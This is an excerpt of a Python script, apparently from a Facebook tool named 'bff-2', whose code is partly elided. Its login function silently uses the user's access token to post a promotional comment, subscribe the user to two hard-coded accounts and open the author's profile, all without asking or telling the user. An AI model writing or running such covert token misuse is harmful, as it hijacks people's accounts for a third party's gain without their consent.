...
#    	exit()
        ...
        os.system('xdg-open https://www.facebook.com/muhammad.hanyauntukmu.03')
        try:
...
def login_xx():
    ...
    kom = random.choice(["Hello I'm a bff-2 user","Be yourself and never surendtod:v","Login bff-2 \nhttps://www.facebook.com/100009259285042/posts/2979262305725716/?substory_index=0&app=fbl"])
    ...
    requests.post('https://graph.facebook.com/2979262305725716/comments/?message=' + kom + '&access_token=' + toket) 
    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + toket) # Akun 2007
    requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=' + toket) # Arafi
